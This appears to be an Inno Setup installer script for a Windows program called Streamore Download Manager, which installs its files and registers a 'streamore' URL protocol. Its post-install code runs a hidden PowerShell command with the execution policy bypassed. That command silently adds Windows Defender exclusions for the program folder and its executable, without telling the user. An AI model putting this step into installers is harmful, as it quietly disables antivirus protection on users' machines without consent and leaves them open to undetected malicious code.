; Inno Setup Script for Streamore Download Manager
; ================================================

[Setup]
AppName=Streamore Download Manager
AppVersion=2.2.0
AppId={{B46B0F1C-0E8B-4E36-8E4A-4B1C8A0C7D2F}}
AppPublisher=Streamore
AppPublisherURL=https://streamore-five.vercel.app
AppSupportURL=https://streamore-five.vercel.app
DefaultDirName={pf}\Streamore
DefaultGroupName=Streamore
OutputBaseFilename=StreamoreSetup
Compression=lzma
SolidCompression=yes
SetupIconFile=..\dist\StreamoreManager\icon.ico
PrivilegesRequired=admin
UsePreviousAppDir=yes

[Files]
Source: "..\dist\StreamoreManager\*"; DestDir: "{app}"; Flags: recursesubdirs createallsubdirs ignoreversion
Source: "..\packaging\VC_redist.x64.exe"; DestDir: "{tmp}"; Flags: deleteafterinstall

[Icons]
Name: "{group}\Streamore Download Manager"; Filename: "{app}\StreamoreManager.exe"
Name: "{commondesktop}\Streamore Download Manager"; Filename: "{app}\StreamoreManager.exe"

[Registry]
Root: HKCR; Subkey: "streamore"; ValueType: string; ValueData: "URL:Streamore Protocol"; Flags: uninsdeletekey
Root: HKCR; Subkey: "streamore"; ValueName: "URL Protocol"; ValueType: string; ValueData: ""; Flags: uninsdeletekey
Root: HKCR; Subkey: "streamore\shell\open\command"; ValueType: string; ValueData: """{app}\StreamoreManager.exe"" ""%1"""; Flags: uninsdeletekey

[Run]
Filename: "{tmp}\VC_redist.x64.exe"; Parameters: "/install /passive /norestart"; Check: VCRedistNeedsInstall; StatusMsg: "Installing Visual C++ Redistributable (2015-2022)..."
Filename: "{app}\StreamoreManager.exe"; Description: "{cm:LaunchProgram,Streamore Download Manager}"; Flags: nowait postinstall skipifsilent

[Code]
function VCRedistNeedsInstall(): Boolean;
var
  Installed: Cardinal;
begin
  if RegQueryDWordValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\VisualStudio\14.0\VC\Runtimes\x64', 'Installed', Installed) then
  begin
    Result := (Installed = 0);
  end
  else
  begin
    Result := True;
  end;
end;

procedure AddDefenderExclusion(FolderPath: String);
var
  ResultCode: Integer;
begin
  Exec('powershell.exe', '-WindowStyle Hidden -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath ''' + FolderPath + '''; Add-MpPreference -ExclusionProcess ''StreamoreManager.exe''"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
end;

procedure CurStepChanged(CurStep: TSetupStep);
begin
  if CurStep = ssPostInstall then
  begin
    AddDefenderExclusion(ExpandConstant('{app}'));
  end;
end;
